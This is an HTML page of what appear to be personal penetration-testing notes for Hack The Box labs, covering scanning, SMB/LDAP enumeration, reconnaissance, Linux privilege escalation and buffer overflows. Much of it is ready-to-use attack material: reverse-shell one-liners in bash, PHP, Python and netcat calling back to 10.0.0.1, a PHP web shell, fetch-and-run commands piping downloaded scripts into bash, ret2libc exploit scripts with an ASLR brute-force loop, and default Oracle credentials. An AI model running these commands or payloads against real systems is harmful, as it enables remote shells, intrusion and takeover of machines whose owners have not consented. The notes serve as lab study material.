<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentest Cheat Sheet</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Notes on pen-testing and htb challenges.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Pentest Cheat Sheet</a></li><li class="chapter-item expanded "><a href="scan.html"><strong aria-hidden="true">1.</strong> Scanning &amp; Enumeration</a></li><li class="chapter-item expanded "><a href="recon.html"><strong aria-hidden="true">2.</strong> Information Gathering (Reconnaissance)</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="linux/enum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="linux/rev-shell.html"><strong aria-hidden="true">3.2.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="linux/privesc.html"><strong aria-hidden="true">3.3.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="linux/overflow.html"><strong aria-hidden="true">3.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="linux/checklist.html"><strong aria-hidden="true">3.5.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows/file-upload.html"><strong aria-hidden="true">4.1.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="windows/overflow.html"><strong aria-hidden="true">4.2.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="windows/active.html"><strong aria-hidden="true">4.3.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="windows/privesc.html"><strong aria-hidden="true">4.4.</strong> Privesc</a></li><li class="chapter-item expanded "><a href="windows/rev-shell.html"><strong aria-hidden="true">4.5.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="windows/ntlm.html"><strong aria-hidden="true">4.6.</strong> NTLM Hashes</a></li><li class="chapter-item expanded "><a href="windows/persistence.html"><strong aria-hidden="true">4.7.</strong> Maintaining Access</a></li><li class="chapter-item expanded "><a href="windows/checklist.html"><strong aria-hidden="true">4.8.</strong> Check-list</a></li></ol></li><li class="chapter-item expanded "><a href="brute-force.html"><strong aria-hidden="true">5.</strong> Brute-Force</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Web Applications</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="web/enum.html"><strong aria-hidden="true">6.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="web/sql.html"><strong aria-hidden="true">6.2.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="web/file-upload.html"><strong aria-hidden="true">6.3.</strong> File Upload</a></li><li class="chapter-item expanded "><a href="web/fuzz.html"><strong aria-hidden="true">6.4.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="web/lfi.html"><strong aria-hidden="true">6.5.</strong> LFI</a></li><li class="chapter-item expanded "><a href="web/xss.html"><strong aria-hidden="true">6.6.</strong> XSS</a></li></ol></li><li class="chapter-item expanded "><a href="steganography.html"><strong aria-hidden="true">7.</strong> Steganography</a></li><li class="chapter-item expanded "><a href="msfvenom.html"><strong aria-hidden="true">8.</strong> MSF-Venom</a></li><li class="chapter-item expanded "><a href="wireless.html"><strong aria-hidden="true">9.</strong> Wireless Penetration Testing</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Pentest Cheat Sheet</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#pentest-cheat-sheet" id="pentest-cheat-sheet">Pentest Cheat Sheet</a></h1>
<h2><a class="header" href="#notes-on-pen-testing-and-htb-challenges" id="notes-on-pen-testing-and-htb-challenges">Notes on pen-testing and htb challenges.</a></h2>
<p><a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159%5D">Boxes Spreadsheet</a></p>
<table><thead><tr><th>Linux Boxes</th><th>Windows Boxes</th><th>More challenging</th></tr></thead><tbody>
<tr><td>openadmin</td><td>active</td><td>jeeves</td></tr>
</tbody></table>
<h3><a class="header" href="#more-useful-notes-on-pentesting" id="more-useful-notes-on-pentesting">More useful notes on Pentesting</a></h3>
<p><a href="https://book.hacktricks.xyz/pentesting-methodology">The hacking bible - hacktricks</a></p>
<p><a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">TJnull’s Preparation Guide for PWK/OSCP</a></p>
<h1><a class="header" href="#scanning--enumeration" id="scanning--enumeration">Scanning &amp; Enumeration</a></h1>
<h2><a class="header" href="#scanning-with-nmap" id="scanning-with-nmap">Scanning with nmap</a></h2>
<pre><code>nmap -T4 -p- -A
</code></pre>
<pre><code>nmap -sV -sC -oA $file $IP
</code></pre>
<h3><a class="header" href="#nmap-scripting-language" id="nmap-scripting-language">nmap Scripting Language</a></h3>
<pre><code>nmap -p $PORT --script $NAME -oA $IP
</code></pre>
<p>Script names can be: safe, vuln, discovery, version,brute, intrusive, auth, broadcast</p>
<h2><a class="header" href="#enumerating-smb" id="enumerating-smb">Enumerating SMB</a></h2>
<h3><a class="header" href="#smb-client" id="smb-client">SMB client</a></h3>
<pre><code>smbclient -L \\\\192.168.57.134\\
</code></pre>
<pre><code>smbclient \\\\192.168.57.134\\FileShare

To download all of the files in a share
smbclient //192.168.57.134/FileShare
smb: \&gt; recurse ON
smb: \&gt; prompt OFF
smb: \&gt; mget *
</code></pre>
<pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP
</code></pre>
<h3><a class="header" href="#smb-map" id="smb-map">SMB map</a></h3>
<pre><code>smbmap -u USER -H IP
smbmap -H IP -R --depth 5

search for files
smbmap -R FOLDER -H IP

download files
smbmap -R FOLDER -H IP -A Group.xml -q

using creds
smbmap -d active.htb -u user -p password -H IP
</code></pre>
<p>To mount smb shares</p>
<pre><code>mount -t cifs //IP/folder /mnt/smb
</code></pre>
<h3><a class="header" href="#brute-force-smb-login" id="brute-force-smb-login">Brute force smb login</a></h3>
<pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_login                                                                    
msf5 auxiliary(scanner/smb/smb_login) &gt; set pass_file wordlist                                 
pass_file =&gt; wordlist
msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_file users.txt 
USER_file =&gt; users.txt   
msf5 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS fuse.htb                                                                                              
msf5 auxiliary(scanner/smb/smb_login) &gt; run
</code></pre>
<p>Find creds and run smb client again</p>
<h2><a class="header" href="#enumerating-using-rpcclient" id="enumerating-using-rpcclient">Enumerating using rpcclient</a></h2>
<pre><code>rpcclient -U DOMAIN\\user IP

rpcclient $&gt; enumdomusers
rpcclient $&gt; enumprivs
rpcclient $&gt; enumprinters
</code></pre>
<h2><a class="header" href="#enumerating-mountsrpcbind" id="enumerating-mountsrpcbind">Enumerating Mounts(RPCbind)</a></h2>
<pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.148.131
</code></pre>
<h2><a class="header" href="#enum4linux" id="enum4linux">Enum4Linux</a></h2>
<h2><a class="header" href="#enum-telnet" id="enum-telnet">Enum telnet</a></h2>
<pre><code>telnet IP PORT
</code></pre>
<h3><a class="header" href="#check-for-pings-tcpdump" id="check-for-pings-tcpdump">check for pings (tcpdump)</a></h3>
<pre><code>Listener
sudo tcpdump ip proto \\icmp -i tun0

ping IP -c 1
</code></pre>
<h2><a class="header" href="#ftp" id="ftp">FTP</a></h2>
<pre><code>ftp IP
anonymous login
enable binary mode
binary
</code></pre>
<h2><a class="header" href="#ldap" id="ldap">LDAP</a></h2>
<pre><code>To get the domain name
ldapsearch -x h IP -s base namingcontexts

To get the domain information
ldapsearch -x h IP -s sub -b 'DC=cascade,DC=local'
</code></pre>
<h2><a class="header" href="#additional-scanning-tools" id="additional-scanning-tools">Additional Scanning Tools</a></h2>
<h3><a class="header" href="#masscan" id="masscan">Masscan</a></h3>
<pre><code>mass -p1-65535 --rate 1000 192.168.57.134
</code></pre>
<h3><a class="header" href="#autorecon" id="autorecon">Autorecon</a></h3>
<p>https://github.com/Tib3rius/AutoRecon</p>
<h1><a class="header" href="#information-gathering-reconnaissance" id="information-gathering-reconnaissance">Information Gathering (Reconnaissance)</a></h1>
<p>Target Validation WHOIS, nslookup, dnsrecon</p>
<p>Finding Subdomains Google FU, dig, Nmap, Sublist3r, Bluto, crt.sh, etc</p>
<p>Fingerprinting Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat</p>
<p>Data Breaches HaveIBeenPwned, Breach-Parse, WeLeakInfo</p>
<p>Email Gathering Hunter.io</p>
<h2><a class="header" href="#domain-lookups" id="domain-lookups">Domain Lookups</a></h2>
<h3><a class="header" href="#the-harvester" id="the-harvester">The Harvester</a></h3>
<pre><code>theharvester -d tesla.com -l 500 -b google
</code></pre>
<h2><a class="header" href="#web-information-gathering" id="web-information-gathering">Web Information Gathering</a></h2>
<h1><a class="header" href="#enumeration" id="enumeration">Enumeration</a></h1>
<h2><a class="header" href="#enum4linux-1" id="enum4linux-1">Enum4linux</a></h2>
<pre><code>enum4linux -a $IP
</code></pre>
<h2><a class="header" href="#pspy" id="pspy">PSpy</a></h2>
<p><a href="https://github.com/DominicBreuker/pspy">pspy - unprivileged Linux process snooping</a></p>
<h1><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h1>
<h2><a class="header" href="#bash" id="bash">Bash</a></h2>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1

bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'
</code></pre>
<h2><a class="header" href="#php" id="php">PHP</a></h2>
<pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
</code></pre>
<pre><code>&lt;?php system($_GET['cmd']); ?&gt;
echo system($_REQUEST['cmd']); #Add the php tags
/file.php?cmd=whoami
</code></pre>
<h2><a class="header" href="#python" id="python">Python</a></h2>
<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<h3><a class="header" href="#python-pty-shells" id="python-pty-shells">python-pty-shells</a></h3>
<p>https://github.com/infodox/python-pty-shells</p>
<p>Edit tcp_pty_backconnect.py</p>
<pre><code>On Victim
wget IP:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py

On Attacker
python tcp_pty_shell_handler.py -b IP:PORT

On Victim
python /dev/shm/.rev.py
</code></pre>
<h2><a class="header" href="#netcat" id="netcat">Netcat</a></h2>
<pre><code>nc -e /bin/sh 10.0.3.4 9001

Listen with

nc -lvnp 9001
</code></pre>
<pre><code>nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f
</code></pre>
<h3><a class="header" href="#downloading-files-with-netcat" id="downloading-files-with-netcat">Downloading files with netcat</a></h3>
<p>Open receiving connection</p>
<pre><code>nc -lvnp 1234 &gt; file.zip

Send the file over

nc -w 4 &lt;your_hackthebox_ip&gt; 1234 &lt; file_name.zip
</code></pre>
<h2><a class="header" href="#msfvenom" id="msfvenom">MSFvenom</a></h2>
<h2><a class="header" href="#improving-shells" id="improving-shells">Improving Shells</a></h2>
<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'

echo os.system('/bin/bash')

/bin/sh -i
</code></pre>
<p>Once bash is running in the PTY, background the shell with Ctrl-Z</p>
<p>While the shell is in the background, now examine the current terminal and STTY </p>
<pre><code>echo $TERM
stty -a
stty raw -echo
fg
</code></pre>
<p>Set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
<pre><code>reset
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
</code></pre>
<h1><a class="header" href="#privesc" id="privesc">Privesc</a></h1>
<h2><a class="header" href="#linenum" id="linenum">LinEnum</a></h2>
<pre><code>python -m SimpleHTTPServer 8000
</code></pre>
<pre><code>curl IP:8000/linenum.sh | bash
</code></pre>
<p>Add -t for a thorough check</p>
<h2><a class="header" href="#linux-priv-checker" id="linux-priv-checker">Linux priv checker</a></h2>
<h2><a class="header" href="#linux-smart-enumeration" id="linux-smart-enumeration">linux-smart-enumeration</a></h2>
<p>Unlike LinEnum, lse tries to gradualy expose the information depending on its importance from a privesc point of view.</p>
<p>https://github.com/diego-treitos/linux-smart-enumeration</p>
<h2><a class="header" href="#useful-commands" id="useful-commands">Useful commands</a></h2>
<p>Obtain the kernel version</p>
<pre><code>uname -a
</code></pre>
<p>Check for misconfigurations in permissions</p>
<pre><code>sudo -l
</code></pre>
<p>Find processes running as root</p>
<pre><code>ps -ef | grep root
</code></pre>
<h2><a class="header" href="#finding-suid-bits" id="finding-suid-bits">Finding SUID bits</a></h2>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -4000 -ls 2&gt;/dev/null
</code></pre>
<h2><a class="header" href="#port-forwarding" id="port-forwarding">Port Forwarding</a></h2>
<p><code>ss -tulpn</code> it will tell us what socket connections are running</p>
<p>To forward a port</p>
<pre><code>ssh -L 10000:localhost:10000 &lt;username&gt;@&lt;ip&gt;
</code></pre>
<h3><a class="header" href="#meterpreter" id="meterpreter">Meterpreter</a></h3>
<pre><code>portfwd add -l 22 -p 22 -r 127.0.0.1
</code></pre>
<p>-l is our local port we want to use.
-p is the remote port we want to get access to.
-r is the remote address</p>
<h3><a class="header" href="#socat-binary" id="socat-binary">socat binary</a></h3>
<pre><code>/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
</code></pre>
<p><a href="https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py">linuxprivchecker.py -- a Linux Privilege Escalation Check Script</a></p>
<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></p>
<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">Linux Privilege Escalation using SUID Binaries</a></p>
<p><a href="https://payatu.com/guide-linux-privilege-escalation"> A guide to Linux Privilege Escalation</a></p>
<h1><a class="header" href="#buffer-overflow" id="buffer-overflow">Buffer Overflow</a></h1>
<h2><a class="header" href="#test-overflow" id="test-overflow">Test Overflow</a></h2>
<pre><code>./binary `python -c 'print &quot;A&quot;*500'`
</code></pre>
<h2><a class="header" href="#open-binary-with-gdb" id="open-binary-with-gdb">Open binary with gdb</a></h2>
<p>First install Python Exploit Development Assistance for GDB.</p>
<pre><code>git clone https://github.com/longld/peda.git ~/peda
echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
</code></pre>
<pre><code>gdb ./binary
gdb# b main
gdb# r
</code></pre>
<h2><a class="header" href="#identify-if-host-has-aslr" id="identify-if-host-has-aslr">Identify if host has ASLR</a></h2>
<p>ASLR - when the address for libc keeps changing.</p>
<pre><code>ldd binary | grep libc (run multiple times and check if address changes)
</code></pre>
<p>Disable ASLR</p>
<pre><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre>
<h2><a class="header" href="#create-patterns" id="create-patterns">Create patterns</a></h2>
<p>Create a pattern tht never repeats/ unique string.</p>
<pre><code>locate pattern_
pattern_create.rb -l 200
</code></pre>
<p>Pass argument to binary</p>
<pre><code>gdb ./binary
gdb# r '$PATTERN'
</code></pre>
<p>Copy memory addres of the crash </p>
<pre><code class="language-bash">pattern_offset.rb -q 0x64413764   #(Address)
Found match at offset 112
</code></pre>
<h2><a class="header" href="#start-buffer-overflow-script" id="start-buffer-overflow-script">Start buffer overflow script</a></h2>
<pre><code class="language-python">import struct

buf = &quot;A&quot; * 112
buf += struct.pack(&quot;&lt;I&quot;,0xd3adc0d3)

print buf
</code></pre>
<pre><code>gdb ./binary
gdb# r 'python buff.py'
</code></pre>
<h2><a class="header" href="#find-important-addresses" id="find-important-addresses">Find important addresses</a></h2>
<h3><a class="header" href="#on-victim-machine" id="on-victim-machine">On Victim machine</a></h3>
<pre><code class="language-bash">ldd ovrfl | grep libc #returns the libc address and location
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system # get system@@GLIBC offset address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit # get exit@@GLIBC offset address
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep bin/sh # get bin/sh string offset address
</code></pre>
<h3><a class="header" href="#or-using-gdb-in-similar-vm-aslr-is-on" id="or-using-gdb-in-similar-vm-aslr-is-on">Or using gdb in similar VM (ASLR is on)</a></h3>
<pre><code class="language-retlib.c">#include &lt;stdlib.h&gt;
 void main() {
     system(&quot;/bin/sh&quot;);
 }
</code></pre>
<pre><code>gcc retlib.c -o retlibc
gdb ./retlib
#gdb p system   #get system address
#gdb p exit   #get exit address
#gdb searchmem /bin/sh #get /bin/sh address
#gdb find 0xf7e0c980, +9999999, &quot;/bin/sh&quot;  #get /bin/sh address
</code></pre>
<h3><a class="header" href="#additions-to-script" id="additions-to-script">Additions to script</a></h3>
<pre><code class="language-python">import struct

system_addr = struct.pack(&quot;&lt;I&quot;,0x88482f8)
exit_addr = struct.pack(&quot;&lt;I&quot;,0xd3adc0d3)
arg_addr = struct.pack(&quot;&lt;I&quot;,0x88482f8)

buf = &quot;A&quot; * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
</code></pre>
<pre><code>gdb# r 'python buff.py'
</code></pre>
<h3><a class="header" href="#bruteforce-aslr" id="bruteforce-aslr">Bruteforce ASLR</a></h3>
<p>On the actual host grab one of the libc addresses.</p>
<pre><code class="language-python">from subprocess import call
import struct

libc_base_addr = 0x88482f8

system_off = 0xd3adc0d3
exit_off = 0xd3adc0d3
arg_sh = 0xd3adc0d3

system_addr = struct.pack(&quot;&lt;I&quot;,libc_base_addr + system_off)
exit_addr = struct.pack(&quot;&lt;I&quot;, libc_base_addr + exit_off)
arg_addr = struct.pack(&quot;&lt;I&quot;,libc_base_addr + arg_sh)

buf = &quot;A&quot; * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i=0
while (i &lt; 512):
    print &quot;Try: %s&quot; %i
    i +=1
    ret = call([&quot;/usr/local/bin/ovrflw&quot;,buf])
</code></pre>
<p>If ASLR is off the script will work without the loop and with the print at the end</p>
<pre><code>./binary $(python /dev/shm/exploit.py)
</code></pre>
<h1><a class="header" href="#check-list" id="check-list">Check-list</a></h1>
<h2><a class="header" href="#info-sheet" id="info-sheet">Info-sheet</a></h2>
<ul>
<li>DNS-Domain name:</li>
<li>Host name:</li>
<li>OS:</li>
<li>Server:</li>
<li>Kernel:</li>
<li>Workgroup:</li>
<li>Windows domain:</li>
</ul>
<p>Services and ports:
INSERTTCPSCAN</p>
<h2><a class="header" href="#recon" id="recon">Recon</a></h2>
<pre><code>Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
</code></pre>
<h3><a class="header" href="#port-21---ftp" id="port-21---ftp">Port 21 - FTP</a></h3>
<ul>
<li>FTP-Name:</li>
<li>FTP-version:</li>
<li>Anonymous login:</li>
</ul>
<p>INSERTFTPTEST</p>
<pre><code>nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-22---ssh" id="port-22---ssh">Port 22 - SSH</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Takes-password:</li>
<li>If you have usernames test login with username:username</li>
</ul>
<p>INSERTSSHCONNECT</p>
<pre><code>nc INSERTIPADDRESS 22
</code></pre>
<h3><a class="header" href="#port-25" id="port-25">Port 25</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>VRFY:</li>
</ul>
<p>INSERTSMTPCONNECT</p>
<pre><code>nc -nvv INSERTIPADDRESS 25
HELO foo&lt;cr&gt;&lt;lf&gt;

telnet INSERTIPADDRESS 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-69---udp---tftp" id="port-69---udp---tftp">Port 69 - UDP - TFTP</a></h3>
<p>This is used for tftp-server.</p>
<h3><a class="header" href="#port-110---pop3" id="port-110---pop3">Port 110 - Pop3</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
</ul>
<p>INSERTPOP3CONNECT</p>
<pre><code>telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
</code></pre>
<h3><a class="header" href="#port-111---rpcbind" id="port-111---rpcbind">Port 111 - Rpcbind</a></h3>
<pre><code>rpcinfo -p INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-135---msrpc" id="port-135---msrpc">Port 135 - MSRPC</a></h3>
<p>Some versions are vulnerable.</p>
<h3><a class="header" href="#port-143---imap" id="port-143---imap">Port 143 - Imap</a></h3>
<h3><a class="header" href="#port-139445---smb" id="port-139445---smb">Port 139/445 - SMB</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Domain/workgroup name:</li>
<li>Domain-sid:</li>
<li>Allows unauthenticated login:</li>
</ul>
<pre><code>nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445


enum4linux -a INSERTIPADDRESS
rpcclient -U &quot;&quot; INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
</code></pre>
<h3><a class="header" href="#port-161162-udp---snmp" id="port-161162-udp---snmp">Port 161/162 UDP - SNMP</a></h3>
<pre><code>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
</code></pre>
<pre><code># Common community strings
public
private
community
</code></pre>
<h3><a class="header" href="#port-554---rtsp" id="port-554---rtsp">Port 554 - RTSP</a></h3>
<h3><a class="header" href="#port-1030103210331038" id="port-1030103210331038">Port 1030/1032/1033/1038</a></h3>
<p>Used by RPC to connect in domain network.</p>
<h2><a class="header" href="#port-1521---oracle" id="port-1521---oracle">Port 1521 - Oracle</a></h2>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Password protected:</li>
</ul>
<pre><code>tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-2049---nfs" id="port-2049---nfs">Port 2049 - NFS</a></h3>
<pre><code>showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
</code></pre>
<h3><a class="header" href="#port-2100---oracle-xml-db" id="port-2100---oracle-xml-db">Port 2100 - Oracle XML DB</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Default logins:</li>
</ul>
<pre><code>sys:sys
scott:tiger
</code></pre>
<p>Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</p>
